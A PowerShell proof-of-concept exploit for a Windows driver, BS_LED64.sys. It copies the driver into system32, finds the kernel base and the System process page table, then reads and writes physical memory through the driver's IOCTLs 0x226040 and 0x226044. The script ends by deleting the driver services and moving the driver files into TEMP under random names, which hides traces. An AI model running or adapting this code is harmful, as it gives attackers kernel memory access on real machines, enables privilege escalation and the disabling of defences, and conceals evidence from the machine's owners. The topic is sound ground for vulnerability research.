Clear-Host
Write-Host

# BS_RVSIO <> BS_LED 
# Physical Memory Read/Write PoC
# BS_RCIO, don't have this Ioctl, 
#  Intersting

Copy-Item `
    -Path (Join-Path $PSScriptRoot "BS_LED64.sys") `
    -Destination "$env:windir\system32\BS_LED64.sys"

$VA = Get-KernelBaseAddress
$PA = Resolve-DirectoryTable -VA64 $VA -ProcessID 4

$hDevice = Get-FileHandle -FileName BS_LED64 -AlternativeName BS_LED

$Data_Buffer  = $null
$Size_To_Read = 16
$Size_Ceiling = [Math]::Max(4, [int]([Math]::Ceiling($Size_To_Read / 8.0) * 8))

try {

  # ~~~~~~~~~ @
  # Read Case @
  # ~~~~~~~~~ @

  try {

    $InOutPtr   = New-IntPtr -Size $Size_Ceiling -TypeSize ([UInt32]) -Values ($PA)
    $InvokeCall = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x226040 -InOutPtr $InOutPtr -InputSize $Size_Ceiling -OutputSize $Size_Ceiling
    
    [String]::Format("DeviceIO Read Call --> {0} (Bytes Returned: {1})", $InvokeCall.Success, $InvokeCall.BytesRet)
    
    if ($InvokeCall.Success) {
      Write-Host
      $Data_Buffer = [Byte[]]::new($Size_To_Read)
      [Marshal]::Copy($InOutPtr, $Data_Buffer, 0, $Size_To_Read)
      $Data_Buffer | Format-HexView -Mode 8x
    }
  } finally {
      Free-IntPtr $InOutPtr -Method Auto
  }

  # ~~~~~~~~~~ @
  # Write Case @
  # ~~~~~~~~~~ @
  
  if ($Data_Buffer) {
      try {

      $BufferLen   = $Data_Buffer.Length
      $StructLen   = 4 + $BufferLen
      $InOutBuffer = [Byte[]]::new($StructLen)

      [BitConverter]::GetBytes([UInt32]$PA).CopyTo($InOutBuffer, 0)
      [Array]::Copy($Data_Buffer, 0, $InOutBuffer, 4, $BufferLen)

      $InOutPtr   = New-IntPtr -Data $InOutBuffer
      $InvokeCall = Invoke-IoctlCall -IoCtrlCode 0x226044 -Mode 1 -FileHandle $hDevice -InOutPtr $InOutPtr -InputSize $StructLen -OutputSize 0

      Write-Host
      [String]::Format("DeviceIO Write Call --> {0} (Bytes Returned: {1})", $InvokeCall.Success, $InvokeCall.BytesRet)

    } finally {
      Free-IntPtr $InOutPtr
    }
  }

} finally {
  if ($hDevice) {
      Free-IntPtr $hDevice -Method NtHandle
  }
}

$TempDir   = $env:TEMP
$SourceDir = "$env:windir\System32"

$Binary = "BS_LED64", "BS_LED", "BS_RVSIO64", "BS_RVSIO", "BS_RCIO64", "BS_RCIO"
$Binary | % {
    $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
    $DestPath   = Join-Path -Path $TempDir   -ChildPath ([guid]::NewGuid().ToString())
    Stop-Service -Name $_ -ea 0
    sc.exe delete $_ | Out-Null
    if (Test-Path $DriverPath) {
	    Move-Item -Path $DriverPath -Destination $DestPath -Force -ea 0
    }
}